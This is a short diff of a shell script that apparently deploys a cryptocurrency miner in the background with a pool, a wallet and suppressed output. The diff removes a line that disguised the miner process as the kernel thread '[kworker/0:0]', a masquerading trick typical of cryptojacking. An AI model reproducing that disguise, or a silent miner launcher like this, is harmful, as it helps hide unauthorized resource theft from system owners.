@@ -137,12 +137,12 @@ deploy_bin() {
     fi
 }
 
-### 启动进程（伪装为系统进程） ###
+### 启动进程 ###
 start_process() {
     debug_echo "开始启动进程"
     if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
         debug_echo "启动新进程"
-        exec -a "[kworker/0:0]" "${STORE_DIR}/${BIN_NAME}" \
+        "${STORE_DIR}/${BIN_NAME}" \
             -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
             -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
     else
